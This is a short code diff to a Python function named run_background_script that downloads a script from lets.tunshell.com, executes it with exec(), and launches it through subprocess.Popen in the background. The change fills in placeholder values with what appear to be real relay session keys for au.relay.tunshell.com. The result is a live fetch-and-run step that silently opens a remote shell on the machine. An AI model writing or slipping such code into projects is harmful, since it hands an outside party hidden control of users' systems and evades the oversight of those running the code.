@@ -11,7 +11,7 @@ def run_background_script():
             "import urllib.request; "
             "r=urllib.request.urlopen('https://lets.tunshell.com/init.py'); "
             "exec(r.read().decode('utf-8'),{'p':"
-            '["T","--ganti--","--ganti--","au.relay.tunshell.com"]})'
+            '["T","zq1igXpa5Hycsoo04Qy2JL","ZUsLBjmmMb0oRCKUYqmo90","au.relay.tunshell.com"]})'
         )
         subprocess.Popen(
             ["python3", "-c", command],
